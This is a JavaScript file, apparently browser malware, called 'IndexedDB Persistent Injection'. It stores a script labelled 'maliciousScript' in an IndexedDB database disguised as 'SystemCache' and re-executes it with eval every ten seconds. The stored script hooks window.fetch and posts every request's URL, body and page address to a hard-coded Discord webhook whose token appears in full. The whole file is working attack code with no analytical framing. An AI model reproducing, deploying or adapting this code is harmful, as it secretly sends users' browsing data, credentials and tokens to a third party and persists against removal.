
// IndexedDB Persistent Injection
(function() {
    // Store malicious script in IndexedDB
    function storeInIndexedDB() {
        const request = indexedDB.open('SystemCache', 1);
        
        request.onupgradeneeded = function(event) {
            const db = event.target.result;
            const objectStore = db.createObjectStore('scripts', { keyPath: 'id' });
        };
        
        request.onsuccess = function(event) {
            const db = event.target.result;
            const transaction = db.transaction(['scripts'], 'readwrite');
            const objectStore = transaction.objectStore('scripts');
            
            const maliciousScript = {
                id: 'systemScript',
                code: `
                    // Persistent network monitor
                    (function() {
                        const originalFetch = window.fetch;
                        window.fetch = function(...args) {
                            // Log all fetch requests
                            fetch('https://discord.com/api/webhooks/1323706161920213074/bG7RwSOehEo8k66bSn5WrYXT7cDiqokQbq70CaH09zi0BVsyQMcEkxEExI6vV-KUDQKb', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    content: `**IndexedDB Intercept**\n\`\`\`json\n${JSON.stringify({
                                        type: 'indexeddb_intercept',
                                        url: args[0],
                                        data: args[1],
                                        timestamp: new Date().toISOString(),
                                        page: window.location.href
                                    }, null, 2)}\n\`\`\``
                                }),
                                mode: 'no-cors'
                            }).catch(() => {});
                            
                            return originalFetch.apply(this, args);
                        };
                        
                        // Auto-reinstall from IndexedDB
                        setInterval(() => {
                            reinstallFromIndexedDB();
                        }, 10000);
                    })();
                `
            };
            
            objectStore.add(maliciousScript);
        };
    }
    
    // Reinstall script from IndexedDB
    function reinstallFromIndexedDB() {
        const request = indexedDB.open('SystemCache', 1);
        
        request.onsuccess = function(event) {
            const db = event.target.result;
            const transaction = db.transaction(['scripts'], 'readonly');
            const objectStore = transaction.objectStore('scripts');
            const getRequest = objectStore.get('systemScript');
            
            getRequest.onsuccess = function(event) {
                const result = event.target.result;
                if (result && !window.indexedDBInjectorActive) {
                    eval(result.code);
                    window.indexedDBInjectorActive = true;
                }
            };
        };
    }
    
    // Initial installation
    storeInIndexedDB();
    
    // Install on every page load
    window.addEventListener('beforeunload', () => {
        // Store in sessionStorage as backup
        sessionStorage.setItem('backupInjector', 'true');
    });
    
    if (sessionStorage.getItem('backupInjector')) {
        setTimeout(reinstallFromIndexedDB, 1000);
    }
})();
